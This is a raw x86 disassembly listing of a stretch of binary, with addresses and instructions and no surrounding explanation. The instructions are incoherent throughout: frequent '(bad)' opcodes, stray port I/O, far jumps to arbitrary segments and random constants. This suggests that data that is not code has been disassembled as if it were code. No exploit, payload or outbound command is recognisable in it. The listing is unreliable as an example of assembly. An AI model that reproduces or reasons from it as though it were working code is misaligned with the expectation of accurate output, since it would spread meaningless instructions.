  424da4:	mov    ah,BYTE PTR [edi+0x28]
  424da7:	ficomp DWORD PTR [esi+0x6f]
  424daa:	adc    al,0x57
  424dac:	je     0x424dd9
  424dae:	push   edx
  424daf:	in     al,0xe6
  424db1:	js     0x424e1e
  424db3:	push   ebp
  424db4:	ss clc 
  424db6:	inc    esi
  424db7:	or     eax,0xdd760280
  424dbc:	jg     0x424d7d
  424dbe:	addr16 xchg ecx,eax
  424dc0:	mov    fs:0x9db444,al
	...
  424dce:	add    BYTE PTR [eax],al
  424dd0:	add    BYTE PTR [esi-0x42494e3],cl
  424dd6:	(bad)  
  424dd7:	mov    esi,0x726f765d
  424ddc:	xor    ch,dh
  424dde:	inc    ebx
  424ddf:	cmp    bh,bl
  424de1:	dec    ebp
  424de2:	lds    eax,FWORD PTR [ecx]
  424de4:	add    BYTE PTR [ebx+eax*1+0xfcf0000],ch
  424deb:	cmp    dh,BYTE PTR [edi+0x6b]
  424dee:	jmp    0x691bf2e2
  424df3:	pushf  
  424df4:	inc    edx
  424df5:	sub    dl,BYTE PTR [esi-0x124b0f8f]
  424dfb:	pop    esp
  424dfc:	cmp    eax,0xf0b503bc
  424e01:	sub    DWORD PTR [edi],eax
  424e03:	xchg   BYTE PTR [edx+0x6c],cl
  424e06:	and    dh,ah
  424e08:	retf   0x46c9
  424e0b:	daa    
  424e0c:	repnz in al,0x5b
  424e0f:	xchg   edi,eax
  424e10:	bound  ebp,QWORD PTR [ebp+0x53c12e06]
  424e16:	dec    ebx
  424e17:	mov    ebp,0x943f88d0
  424e1c:	push   edx
  424e1d:	push   ecx
  424e1e:	les    ecx,FWORD PTR [eax]
  424e20:	dec    edx
  424e21:	cdq    
  424e22:	lods   al,BYTE PTR ds:[esi]
  424e23:	sahf   
  424e24:	push   edx
  424e25:	jmp    0x424e4f
  424e27:	mov    esi,0x1b70a2c2
  424e2c:	jmp    0x424df0
  424e2e:	fsubr  QWORD PTR [ebp-0x2c2b9aa4]
  424e34:	dec    edx
  424e35:	popf   
  424e36:	xchg   BYTE PTR [ebx],dh
  424e38:	push   esi
  424e39:	das    
  424e3a:	fsub   QWORD PTR [ecx]
  424e3c:	ror    BYTE PTR [ecx+0x73],0xfd
  424e40:	mov    gs,WORD PTR [esi]
  424e42:	test   eax,0x8c624874
  424e47:	cmp    ch,BYTE PTR [esi-0x5cf54964]
  424e4d:	add    BYTE PTR [edi-0x6e],0x2
  424e51:	jns    0x424e80
  424e53:	in     al,dx
  424e54:	mov    ebp,edi
  424e56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e57:	mov    eax,ds:0xe70d3957
  424e5c:	stos   BYTE PTR es:[edi],al
  424e5d:	xor    edx,DWORD PTR [edi-0x6264d0db]
  424e63:	or     ebp,eax
  424e65:	mov    edi,0xe7b0c81
  424e6a:	clc    
  424e6b:	mov    es:0xc07262eb,al
  424e71:	dec    edx
  424e72:	or     dl,bh
  424e74:	sub    DWORD PTR [eax+0x79],0x3c74d39
  424e7b:	cmp    ah,bh
  424e7d:	sbb    dl,ah
  424e7f:	inc    ebx
  424e80:	xor    al,0x65
  424e82:	xor    al,0x7c
  424e84:	dec    esp
  424e85:	retf   0xac53
  424e88:	(bad)  
  424e89:	into   
  424e8a:	push   edi
  424e8b:	imul   ebx,DWORD PTR [edx-0x63372bad],0x1a
  424e92:	sbb    eax,0xb8982f4c
  424e97:	and    DWORD PTR [edi-0x48ecd44e],eax
  424e9d:	mov    edi,0x7c0ce186
  424ea2:	aaa    
  424ea3:	adc    eax,0x91ed4c90
  424ea8:	add    BYTE PTR [edi-0x46],cl
  424eab:	pop    ss
  424eac:	dec    esp
  424ead:	dec    esi
  424eae:	mov    fs,ebp
  424eb0:	jecxz  0x424e84
  424eb2:	cli    
  424eb3:	fs push esi
  424eb5:	jg     0x424ee3
  424eb7:	fstp   TBYTE PTR [esi*1+0x4fcf8883]
  424ebe:	dec    edi
  424ebf:	adc    BYTE PTR [ebx+0x2b081c76],bl
  424ec5:	outs   dx,BYTE PTR ds:[esi]
  424ec6:	ja     0x424ecd
  424ec8:	shl    BYTE PTR ds:0xcfae2ef9,1
  424ece:	daa    
  424ecf:	inc    BYTE PTR [ebx+0x6f]
  424ed2:	ins    BYTE PTR es:[edi],dx
  424ed3:	adc    al,0x8c
  424ed5:	mov    esp,0x629328b0
  424eda:	mov    bh,0x74
  424edc:	dec    eax
  424edd:	and    eax,0x5980d093
  424ee2:	fisubr WORD PTR [eax]
  424ee4:	cdq    
  424ee5:	dec    edx
  424ee6:	pushf  
  424ee7:	jecxz  0x424f08
  424ee9:	mov    edx,0xdfe1206a
  424eee:	pop    DWORD PTR [ebp-0xbad18ed]
  424ef4:	(bad)  
  424ef5:	jecxz  0x424ec4
  424ef7:	mov    eax,0x2863e408
  424efc:	mov    esi,DWORD PTR [eax-0x7de4806f]
  424f02:	retf   
  424f03:	sbb    DWORD PTR [eax-0x5eadb370],ebx
  424f09:	jecxz  0x424f23
  424f0b:	ret    0xe5a4
  424f0e:	inc    eax
  424f0f:	lahf   
  424f10:	mov    dl,0x7b
  424f12:	sub    DWORD PTR [ecx+0x35],edi
  424f15:	and    cl,BYTE PTR [esi-0x2c]
  424f18:	mov    esi,DWORD PTR [ebp-0x1c57aad6]
  424f1e:	inc    ebp
  424f1f:	retf   0x6dc1
  424f22:	cmc    
  424f23:	or     ebp,esp
  424f25:	sbb    al,0x98
  424f27:	add    BYTE PTR [ebp-0x7f],bh
  424f2a:	iret   
  424f2b:	sbb    al,BYTE PTR [esi]
  424f2d:	cli    
  424f2e:	xchg   esp,eax
  424f2f:	sub    esi,DWORD PTR [ecx+esi*1+0x7d]
  424f33:	or     eax,0xd4813ed5
  424f38:	and    DWORD PTR [esi+0x52],ecx
  424f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f3c:	ror    DWORD PTR [esi+0xc5c4f7c],cl
  424f42:	repnz mov al,0x7a
  424f45:	cdq    
  424f46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f47:	cwde   
  424f48:	aas    
  424f49:	in     al,dx
  424f4a:	rcr    edx,1
  424f4c:	mov    edi,DWORD PTR [edi+ecx*8-0x78942186]
  424f53:	jns    0x424ed8
  424f55:	inc    edi
  424f56:	pcmpgtb mm3,QWORD PTR [edx+0x5d]
  424f5a:	aad    0x5d
  424f5c:	aas    
  424f5d:	push   0x83dde8bd
  424f62:	pop    ds
  424f63:	and    al,dh
  424f65:	in     eax,dx
  424f66:	mov    cl,0x0
  424f68:	(bad)  
  424f69:	jecxz  0x424ef1
  424f6b:	sub    al,0x6
  424f6d:	inc    esp
  424f6e:	mov    dh,0xa5
  424f70:	int3   
  424f71:	mov    DWORD PTR [ebp-0x2122982e],0xb64a6dc7
  424f7b:	(bad)  
  424f7c:	sbb    edx,DWORD PTR [eax-0x7b]
  424f7f:	(bad)  
  424f81:	jb     0x424fe8
  424f83:	rcl    DWORD PTR [eax],1
  424f85:	arpl   WORD PTR [ebx-0x63],bx
  424f88:	lods   eax,DWORD PTR ss:[esi]
  424f8a:	jl     0x424fe8
  424f8c:	imul   ebp,DWORD PTR [ebx+0x71],0xcdb02ab9
  424f93:	lds    esi,FWORD PTR [edx+0x27]
  424f96:	push   0x27
  424f98:	(bad)  
  424f99:	pop    esp
  424f9a:	pop    eax
  424f9b:	sbb    DWORD PTR [ebp+0x61],ecx
  424f9e:	mov    eax,0x72d16ec2
  424fa3:	aaa    
  424fa4:	mov    al,0x6a
  424fa6:	leave  
  424fa7:	mov    ch,0x4
  424fa9:	xor    eax,0x3c91084b
  424fae:	test   al,0x8f
  424fb0:	jle    0x424f56
  424fb2:	gs inc edx
  424fb4:	int    0x24
  424fb6:	aas    
  424fb7:	(bad)  
  424fb9:	cwde   
  424fba:	int3   
  424fbb:	sub    DWORD PTR [edi+0x61],edi
  424fbe:	jg     0x424f7e
  424fc0:	imul   ebp,DWORD PTR [edx],0xc73dae03
  424fc6:	ds push esp
  424fc8:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424fca:	(bad)  
  424fcb:	sub    eax,0x78159414
  424fd0:	retf   
  424fd1:	(bad)  
  424fd2:	(bad)  
  424fd3:	rcr    BYTE PTR [edx-0x6a],cl
  424fd6:	push   edx
  424fd7:	mov    ds:0x801da45,eax
  424fdc:	jo     0x424fea
  424fde:	dec    edx
  424fdf:	es dec ebx
  424fe1:	inc    esp
  424fe2:	fadd   st,st(4)
  424fe4:	pop    esp
  424fe5:	mov    eax,ds:0x2ebc99c1
  424fea:	xor    ecx,edx
  424fec:	xchg   ebx,eax
  424fed:	mov    edi,0xd4919f1d
  424ff2:	xchg   ebx,eax
  424ff3:	sbb    dl,BYTE PTR [edi+edi*2-0x4544bf75]
  424ffa:	xor    al,0x75
  424ffc:	xor    DWORD PTR [ecx],edi
  424ffe:	sub    eax,0xad595fb2
  425003:	dec    esp
  425004:	scas   eax,DWORD PTR es:[edi]
  425005:	jae    0x425063
  425007:	sub    esp,DWORD PTR [ecx+0x3]
  42500a:	rcl    DWORD PTR [ebp-0x53f64cf6],1
  425010:	outs   dx,BYTE PTR ds:[esi]
  425011:	inc    eax
  425013:	xor    BYTE PTR [eax],dh
  425015:	and    al,BYTE PTR [ebp-0xd]
  425018:	sub    ecx,eax
  42501a:	lock sub esp,DWORD PTR [esi]
  42501d:	ret    
  42501e:	retf   0xdb2
  425021:	push   edx
  425022:	xchg   ecx,eax
  425023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425024:	fisttp QWORD PTR [eax-0x1040382c]
  42502a:	aas    
  42502b:	in     eax,0x65
  42502d:	paddd  mm4,QWORD PTR [eax]
  425030:	cwde   
  425031:	inc    ebx
  425032:	mov    edx,0x9d514cf
  425037:	rcr    WORD PTR [esi+edx*2],cl
  42503b:	dec    edi
  42503c:	cmp    bl,cl
  42503e:	(bad)  
  42503f:	sar    dh,cl
  425041:	inc    esi
  425042:	jae    0x42509e
  425044:	push   ds
  425045:	int3   
  425046:	dec    eax
  425047:	leave  
  425048:	mov    ss,WORD PTR [esi+0x70c5f18c]
  42504e:	fwait
  42504f:	cmp    ah,ch
  425051:	xchg   DWORD PTR [ebx],ebx
  425053:	push   ebx
  425054:	cwde   
  425055:	pop    ebp
  425056:	aad    0xe2
  425058:	sahf   
  425059:	push   es
  42505a:	dec    ebx
  42505b:	and    DWORD PTR [ecx-0x16],0xeec22abb
  425062:	and    ah,BYTE PTR [eax+0x7e038a60]
  425068:	jns    0x42503b
  42506a:	inc    DWORD PTR [edi+0x44e1e5e5]
  425070:	jae    0x425046
  425072:	mov    ebx,0xa16023c0
  425077:	lea    ecx,fs:[eax]
  42507a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42507b:	jno    0x425007
  42507d:	(bad)  
  42507e:	jmp    0x46e6:0xa3c7adf2
  425085:	mov    dh,0x75
  425087:	into   
  425088:	nop
  425089:	outs   dx,BYTE PTR ds:[esi]
  42508a:	or     esi,DWORD PTR ds:0x61c81393
  425090:	push   edi
  425091:	pushf  
  425092:	adc    bh,BYTE PTR [esi]
  425094:	xor    eax,0x181d112f
  425099:	into   
  42509a:	(bad)  
  42509b:	dec    edi
  42509c:	adc    edx,DWORD PTR [esi]
  42509e:	popa   
  42509f:	or     al,0xa2
  4250a1:	add    ebp,edx
  4250a3:	pandn  mm0,QWORD PTR [edi]
  4250a6:	das    
  4250a7:	jecxz  0x425117
  4250a9:	cmovne eax,DWORD PTR [esi]
  4250ac:	xchg   DWORD PTR [edx+0x272431be],ecx
  4250b2:	mov    ebp,0x6a7da2fb
  4250b7:	test   BYTE PTR [edi+0x78],al
  4250ba:	mov    edi,0xc6b9ced3
  4250bf:	and    BYTE PTR [ebp-0x40],ah
  4250c2:	xchg   DWORD PTR [edi-0x5831a6ff],ebp
  4250c8:	inc    esp
  4250c9:	add    eax,0x64bed448
  4250ce:	add    dl,dh
  4250d0:	fldpi  
  4250d2:	das    
  4250d3:	nop
  4250d4:	and    DWORD PTR [ebx],ecx
  4250d6:	pop    esi
  4250d7:	jns    0x425068
  4250d9:	stos   DWORD PTR es:[edi],eax
  4250da:	mov    ebp,0xe13028fb
  4250df:	lahf   
  4250e0:	call   0x23f3cd39
  4250e5:	(bad)  [ebx-0x41]
  4250e8:	not    DWORD PTR [eax+0x32742ce8]
  4250ee:	dec    BYTE PTR [ebx+0x67]
  4250f1:	xlat   BYTE PTR ds:[ebx]
  4250f2:	addr16 inc ecx
  4250f4:	scas   eax,DWORD PTR es:[edi]
  4250f5:	dec    esi
  4250f6:	ror    DWORD PTR [eax+0x62],0xe9
  4250fa:	pop    ebp
  4250fb:	dec    esi
  4250fc:	shl    BYTE PTR [edx+eax*1],1
  4250ff:	adc    dl,BYTE PTR [eax]
  425101:	shl    DWORD PTR [esi],1
  425103:	dec    ebp
  425104:	ficomp WORD PTR [edx-0x7aac8310]
  42510a:	xor    al,0xc
  42510c:	aad    0x77
  42510e:	add    BYTE PTR ds:0xe8de3d42,al
  425114:	pop    ebx
  425115:	xor    DWORD PTR [edi],esp
  425117:	xchg   al,bl
  425119:	mov    ah,0x97
  42511b:	ins    BYTE PTR es:[edi],dx
  42511c:	mov    WORD PTR [edx-0x59],ds
  42511f:	lock cli 
  425121:	and    eax,0x194e673e
  425126:	cmp    ch,BYTE PTR [edi-0x631590e]
  42512c:	fwait
  42512d:	push   edx
  42512e:	dec    esp
  42512f:	xchg   ebx,eax
  425130:	and    ecx,esi
  425132:	add    al,0x4a
  425134:	add    eax,0x3446e290
  425139:	cdq    
  42513a:	scas   al,BYTE PTR es:[edi]
  42513b:	sbb    dh,BYTE PTR [edx+0x2d]
  42513e:	pop    edi
  42513f:	jns    0x425144
  425141:	sar    dh,0x1f
  425144:	mov    ebp,0xbd2caa68
  425149:	cmp    BYTE PTR [edx],dh
  42514b:	add    esp,DWORD PTR [ecx-0x3b]
  42514e:	popf   
  42514f:	(bad)
  425153:	or     ah,BYTE PTR [eax+0x2d2ff771]
  425159:	inc    ecx
  42515a:	mov    ecx,0x105340d5
  42515f:	neg    DWORD PTR [eax-0x5]
  425162:	dec    edi
  425163:	jg     0x4251bb
  425165:	jl     0x42511c
  425167:	xchg   esi,eax
  425168:	and    BYTE PTR [eax+0x1c],bh
  42516b:	adc    ebx,DWORD PTR [edi+0x13c40442]
  425171:	xor    ch,BYTE PTR [edx+0x5ae74f35]
  425177:	jo     0x42519b
  425179:	jp     0x4251a5
  42517b:	ror    BYTE PTR [ebx-0x667234ca],cl
  425181:	dec    eax
  425182:	jp     0x4251cd
  425184:	jne    0x425155
  425186:	and    BYTE PTR [edx+0x15],ah
  425189:	pop    eax
  42518a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42518b:	jmp    FWORD PTR ds:0xf05788a2
  425191:	dec    esp
  425192:	lock jns 0x42520c
	...
  4251a1:	imul   edi,DWORD PTR [esi-0x480049c5],0x4a7bffed
  4251ab:	dec    ecx
  4251ac:	pop    ecx
  4251ad:	xor    eax,0xf94edf90
  4251b2:	enter  0x1,0xac
  4251b6:	add    eax,DWORD PTR [eax]
  4251b8:	add    BYTE PTR [edx+0x2fedcaa],dh
  4251be:	je     0x425227
  4251c0:	out    dx,eax
  4251c1:	mov    ds:0xed3611ed,al
  4251c6:	test   al,0x55
  4251c8:	mov    ecx,0x169a42fc
  4251cd:	fwait
  4251ce:	ss mov ch,0xc6
  4251d1:	push   0xc3da9ce8
  4251d6:	adc    esi,ebx
  4251d8:	mov    ecx,0x51424eb3
  4251dd:	data16 xchg bh,cl
  4251e0:	xchg   DWORD PTR [ebp+0x56e4dfe7],esi
  4251e6:	int3   
  4251e7:	addr16 js 0x42521e
  4251ea:	and    dl,BYTE PTR [esi+0x6f]
  4251ed:	fidivr DWORD PTR [edx+0x28]
  4251f0:	dec    eax
  4251f1:	xchg   BYTE PTR [edx+ecx*1],bh
  4251f4:	lahf   
  4251f5:	stc    
  4251f6:	push   esp
  4251f7:	inc    esi
  4251f8:	dec    dx
  4251fa:	jmp    0x425267
  4251fc:	and    eax,0x37955ee0
  425201:	inc    ebx
  425202:	loope  0x4251bd
  425204:	push   es
  425205:	inc    esp
  425206:	int3   
  425207:	shl    BYTE PTR [ebx+edi*2-0x7e],1
  42520b:	test   eax,0x4d8b54aa
  425210:	inc    ebx
  425211:	push   esi
  425212:	mov    cs:0x9860c23e,al
  425218:	daa    
  425219:	mov    ecx,0x42c84f90
  42521e:	cmp    al,BYTE PTR [edi+0x5b]
  425221:	dec    ebp
  425222:	pop    ebp
  425223:	xchg   esi,eax
  425224:	sar    eax,0x7a
  425227:	xchg   esp,ebp
  425229:	mov    dh,0xff
  42522b:	or     al,0x9
  42522d:	popa   
  42522e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42522f:	iret   
  425230:	lods   al,BYTE PTR ds:[esi]
  425231:	mov    esi,0x5dd75fc0
  425236:	cmp    BYTE PTR [ecx-0x48ca52b9],0xf3
  42523d:	mov    cl,0xeb
  42523f:	mov    ds:0x4b5c165d,al
  425244:	push   DWORD PTR [edx-0x22]
  425247:	call   0xfb99:0x40ec2bf1
  42524e:	dec    edi
  42524f:	out    0x7a,eax
  425251:	retf   0xa211
  425254:	lea    eax,[eax]
  425256:	jo     0x425262
  425258:	fucomp st(0)
  42525a:	loopne 0x4252ab
  42525c:	mov    al,0x87
  42525e:	mov    bh,BYTE PTR [edi+0x59]
  425261:	(bad)  [eax-0x6]
  425264:	jp     0x42523d
  425266:	xchg   BYTE PTR [ecx],cl
  425268:	fstp   TBYTE PTR [eax]
  42526a:	cmp    edx,DWORD PTR [ecx]
  42526c:	push   esi
  42526d:	cmp    eax,0xf2aca020
  425272:	push   eax
  425273:	(bad)  
  425274:	inc    eax
  425275:	iret   
  425276:	hlt    
  425277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425278:	and    esi,DWORD PTR [ebx]
  42527a:	jge    0x4252db
  42527c:	hlt    
  42527d:	mov    ecx,DWORD PTR [ecx]
  42527f:	mov    ds:0xf728db4c,al
  425284:	addr16 sahf 
  425286:	or     esi,ebx
  425288:	sub    al,0x72
  42528a:	xor    eax,0x5ba4d7bf
  42528f:	sbb    ebx,edi
  425291:	shl    DWORD PTR [edi-0x3],0x10
  425295:	lahf   
  425296:	leave  
  425297:	(bad)  
  425298:	mov    eax,ds:0x42261ca
  42529d:	retf   0x535
  4252a0:	cli    
  4252a1:	fwait
  4252a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252a3:	lahf   
  4252a4:	loope  0x425262
  4252a6:	adc    eax,0xef5cb06c
  4252ab:	iret   
  4252ac:	xor    DWORD PTR [ebx+0x2add46bd],edx
  4252b2:	inc    esi
  4252b3:	pop    ebp
  4252b4:	(bad)  
  4252b5:	sti    
  4252b6:	call   0x9326:0x67f4caa7
  4252bd:	add    cl,BYTE PTR [ebx-0x16ad2113]
  4252c3:	ss sub dl,al
  4252c6:	int    0xf0
  4252c8:	lea    edx,[ebx]
  4252ca:	xor    BYTE PTR [eax-0x76b59a00],cl
  4252d0:	add    DWORD PTR [edx-0x3d45371e],edx
  4252d6:	scas   al,BYTE PTR es:[edi]
  4252d7:	adc    ch,BYTE PTR [ebp+0x0]
  4252da:	gs mov bl,0xd2
  4252dd:	repnz dec edx
  4252df:	adc    ebx,DWORD PTR [eax]
  4252e1:	shr    DWORD PTR [edx],1
  4252e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252e4:	mov    ds:0x9f8cab69,eax
  4252e9:	(bad)  
  4252ea:	fidiv  DWORD PTR [ebx-0x7f]
  4252ed:	call   0xf7d5:0xfaea3249
  4252f4:	arpl   WORD PTR [eax],bx
  4252f6:	push   edi
  4252f7:	jge    0x42530b
  4252f9:	fld    DWORD PTR [ebx-0x6845b67]
  4252ff:	jle    0x425377
  425301:	add    DWORD PTR [ebx+0x7b],ecx
  425304:	push   ds
  425305:	test   ebp,ecx
  425307:	loope  0x4252f7
  425309:	pop    ebx
  42530a:	imul   ecx,esi,0xdc159bdf
  425310:	fwait
  425311:	xchg   edi,eax
  425312:	retf   
  425313:	and    DWORD PTR [ebp-0x77],esi
  425316:	cmp    eax,0xac4c068e
  42531b:	and    eax,0x9f489d62
  425320:	pop    edx
  425321:	lahf   
  425322:	and    al,0xbd
  425324:	scas   eax,DWORD PTR es:[edi]
  425325:	rcr    BYTE PTR [ebx-0x2a572747],1
  42532b:	jns    0x425311
  42532d:	aad    0x14
  42532f:	xchg   al,ah
  425331:	gs push ss
  425333:	mov    ebx,0xbfac54dc
  425338:	in     al,0x65
  42533a:	inc    ebx
  42533b:	sub    eax,0x6833f347
  425340:	sub    cl,ch
  425342:	and    BYTE PTR [edi],bh
  425344:	les    esp,FWORD PTR [ebx]
  425346:	sub    DWORD PTR [edi-0x42],0x55cfe6f
  42534d:	sub    DWORD PTR [edi+ebp*1+0x53540f09],ebx
  425354:	ret    
  425355:	sub    eax,0x26947419
  42535a:	ins    DWORD PTR es:[edi],dx
  42535b:	hlt    
  42535c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42535d:	sub    ebp,DWORD PTR [edx]
  42535f:	push   0x38cb18a5
  425364:	and    ecx,DWORD PTR [eax]
  425366:	pop    ss
  425367:	call   0x70528bce
  42536c:	mov    bl,0x3a
  42536e:	into   
  42536f:	outs   dx,BYTE PTR ds:[esi]
  425370:	dec    eax
  425371:	jae    0x4253f0
  425373:	or     bh,cl
  425375:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  425377:	outs   dx,DWORD PTR ds:[esi]
  425378:	div    BYTE PTR [edx-0x11]
  42537b:	mov    cl,0x5f
  42537d:	sbb    bh,bh
  42537f:	test   cl,0x5f
  425382:	bnd je 0x4253ea
  425385:	ret    
  425386:	lahf   
  425387:	sbb    eax,0xb784e21c
  42538c:	and    dh,ch
  42538e:	cmp    dl,BYTE PTR [edx+eiz*4-0x54937996]
  425395:	jle    0x4253b4
  425397:	jg     0x425361
  425399:	jp     0x4253bd
  42539b:	test   DWORD PTR [edi],esi
  42539d:	in     eax,0x93
  42539f:	xchg   ecx,eax
  4253a0:	popf   
  4253a1:	mov    al,0xda
  4253a3:	push   ecx
  4253a4:	and    eax,0xd05687b0
  4253a9:	xlat   BYTE PTR ds:[ebx]
  4253aa:	push   0x2a
  4253ac:	aam    0xe0
  4253ae:	jne    0x4253bf
  4253b0:	xchg   DWORD PTR [ebp-0x2a],edx
  4253b3:	bound  ebx,QWORD PTR [ebx-0x14]
  4253b6:	lea    edx,[eax]
  4253b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253b9:	add    ebx,DWORD PTR [esi+0x72595db9]
  4253bf:	mov    bh,0x5
  4253c1:	rep stos DWORD PTR es:[edi],eax
  4253c3:	adc    esp,DWORD PTR [esi+0x1de9cb70]
  4253c9:	rol    BYTE PTR [esi],cl
  4253cb:	pop    ss
  4253cc:	ret    
  4253cd:	push   edx
  4253ce:	dec    edx
  4253cf:	inc    edi
  4253d0:	push   cs
  4253d1:	jbe    0x42541f
  4253d3:	pop    ebp
  4253d4:	int3   
  4253d5:	fwait
  4253d6:	ins    DWORD PTR es:[edi],dx
  4253d7:	mov    bl,0x8d
  4253d9:	lahf   
  4253da:	adc    DWORD PTR gs:[edx],esi
  4253dd:	lods   eax,DWORD PTR ds:[esi]
  4253de:	and    eax,0x35af36da
  4253e3:	mov    eax,DWORD PTR [ecx+0x7e]
  4253e6:	mov    dl,BYTE PTR [ecx*1-0x12a28439]
  4253ed:	shr    BYTE PTR [eax-0x391dfce4],0xa8
  4253f4:	fdiv   st(6),st
  4253f6:	sub    edx,ebp
  4253f8:	ret    0x3e7f
  4253fb:	mov    bl,BYTE PTR ds:0xb6b6d104
  425401:	outs   dx,BYTE PTR ds:[esi]
  425402:	and    dh,BYTE PTR [edi]
  425404:	push   edi
  425405:	sub    bl,dl
  425407:	in     al,0xe6
  425409:	push   eax
  42540a:	push   esi
  42540b:	ins    BYTE PTR es:[edi],dx
  42540c:	popf   
  42540d:	stos   DWORD PTR es:[edi],eax
  42540e:	pushf  
  42540f:	popa   
  425410:	cli    
  425411:	(bad)  
  425412:	pop    esi
  425413:	mov    ?,ecx
  425415:	jae    0x42541e
  425417:	mov    edx,0x4920bc55
  42541c:	jb     0x425429
  42541e:	pop    edi
  42541f:	xchg   ebx,eax
  425420:	retf   0xacf8
  425423:	mov    edi,DWORD PTR [esi+0x11907dd2]
  425429:	div    DWORD PTR [ecx+eax*2+0x56]
  42542d:	pop    edi
  42542e:	outs   dx,BYTE PTR ds:[esi]
  42542f:	mov    edx,0x2939102f
  425434:	out    dx,al
  425435:	xor    al,0xd7
  425437:	cs and bl,ch
  42543a:	aad    0xf
  42543c:	fwait
  42543d:	imul   ebp,eax,0x3c08c723
  425443:	loop   0x425490
  425445:	dec    eax
  425446:	jne    0x4254b5
  425448:	dec    ecx
  425449:	mov    cl,0xc2
  42544b:	mov    ds:0x81a8fc10,eax
  425450:	sub    eax,DWORD PTR [eax-0x3e]
  425453:	pop    ebx
  425454:	mov    cl,0x90
  425456:	fild   WORD PTR [ecx-0x33fd632e]
  42545c:	xchg   edx,eax
  42545d:	sbb    eax,0xff0b70f9
  425462:	pusha  
  425463:	outs   dx,DWORD PTR ds:[esi]
  425464:	xor    DWORD PTR [edi+0x31d74c41],ecx
  42546a:	test   eax,0x358fb9b2
  42546f:	test   BYTE PTR [eax-0x6290e19b],ah
  425475:	dec    ebp
  425476:	daa    
  425477:	dec    esp
  425478:	or     BYTE PTR [ebx],dh
  42547a:	xchg   esi,eax
  42547b:	hlt    
  42547c:	jae    0x4254cb
  42547e:	and    al,BYTE PTR [ecx+0x7737a1f5]
  425484:	mov    esi,ds
  425486:	push   eax
  425487:	sub    bl,BYTE PTR [esi-0x46]
  42548a:	inc    ebp
  42548b:	daa    
  42548c:	mov    ds:0x8478dd5f,eax
  425491:	dec    edi
  425492:	out    0x4e,al
  425494:	mov    ah,0xc
  425496:	pushf  
  425497:	sti    
  425498:	shl    BYTE PTR [edx+0x72dddf96],0xe
  42549f:	dec    ebx
  4254a0:	pop    eax
  4254a1:	(bad)  
  4254a2:	out    dx,eax
  4254a3:	imul   eax,DWORD PTR [edi-0x78],0x1d
  4254a7:	mov    ebp,?
  4254a9:	mov    eax,0xd441d1ed
  4254ae:	outs   dx,DWORD PTR ds:[esi]
  4254af:	push   ds
  4254b0:	mov    eax,0xab08b4f7
  4254b5:	mov    bl,bh
  4254b7:	loope  0x42544f
  4254b9:	sub    eax,0xc17cc05
  4254be:	popa   
  4254bf:	xor    dl,dh
  4254c1:	(bad)  
  4254c2:	jno    0x4254fa
  4254c4:	mov    al,ds:0x25ccff77
  4254c9:	inc    eax
  4254ca:	(bad)  
  4254cb:	outs   dx,DWORD PTR ds:[esi]
  4254cc:	mov    eax,0x98bb1a21
  4254d1:	lods   eax,DWORD PTR ds:[esi]
  4254d2:	jns    0x42546d
  4254d4:	xor    al,0x3d
  4254d6:	add    ah,BYTE PTR [ebp-0x56]
  4254d9:	mov    BYTE PTR [eax-0x5357f625],al
  4254df:	ror    BYTE PTR [edi],0xf2
  4254e2:	nop
  4254e3:	jg     0x42548a
  4254e5:	pop    ebx
  4254e6:	outs   dx,DWORD PTR ds:[esi]
  4254e7:	leave  
  4254e8:	xor    bh,BYTE PTR [ecx+0x24]
  4254eb:	dec    ebp
  4254ec:	jb     0x4254d5
  4254ee:	or     edx,DWORD PTR [edi-0xc278d13]
  4254f4:	test   DWORD PTR [ebx+0x33104199],0x215c3572
  4254fe:	aad    0xc
  425500:	test   bh,bh
  425502:	int    0x39
  425504:	stos   DWORD PTR es:[edi],eax
  425505:	jno    0x425576
  425507:	push   cs
  425508:	or     esp,DWORD PTR [ecx]
  42550a:	mov    ecx,0xd3be477e
  42550f:	mov    al,ds:0x8faaa6bb
  425514:	push   ecx
  425515:	fld    QWORD PTR [edx-0x3c]
  425518:	fwait
  425519:	or     ch,bl
  42551b:	cs out 0xef,eax
  42551e:	(bad)  
  42551f:	xor    bl,BYTE PTR [edx+0x5f]
  425522:	repnz adc BYTE PTR [edx+0x73],0x3b
  425527:	and    bl,cl
  425529:	test   BYTE PTR [ebp+0x62],ah
  42552c:	xor    al,0x78
  42552e:	add    DWORD PTR [edi+0x78e82e0f],edi
  425534:	leave  
  425535:	ins    DWORD PTR es:[edi],dx
  425536:	fisub  WORD PTR [edx+0x5e]
  425539:	sub    cl,BYTE PTR [edi-0x68]
  42553c:	call   0x5efb6e79
  425541:	sbb    DWORD PTR [esi],0xffffffe6
  425544:	push   esp
  425545:	inc    esp
  425546:	cwde   
  425547:	(bad)  
  425548:	sti    
  425549:	cmp    al,0x32
  42554b:	xor    BYTE PTR [edi],al
  42554d:	test   DWORD PTR [esi],ebp
  42554f:	pop    ds
  425550:	(bad)  
  425551:	jecxz  0x42557f
  425553:	add    esp,DWORD PTR ds:0x68bb2808
  425559:	(bad)  
  42555a:	test   eax,0xc7e7ff47
  42555f:	xlat   BYTE PTR ds:[ebx]
  425560:	scas   eax,DWORD PTR es:[edi]
  425561:	shr    DWORD PTR [edi],cl
  425563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425564:	in     al,dx
	...
  425571:	jmp    0x4255bb
  425573:	or     al,0xc7
  425575:	scas   eax,DWORD PTR es:[edi]
  425576:	(bad)  
  425577:	jmp    0x4255e5
  425579:	popa   
  42557a:	mov    cl,ch
  42557c:	or     edi,DWORD PTR [ebx-0x5a61e6cb]
  425582:	int3   
  425583:	add    DWORD PTR [eax],eax
  425585:	lods   al,BYTE PTR ds:[esi]
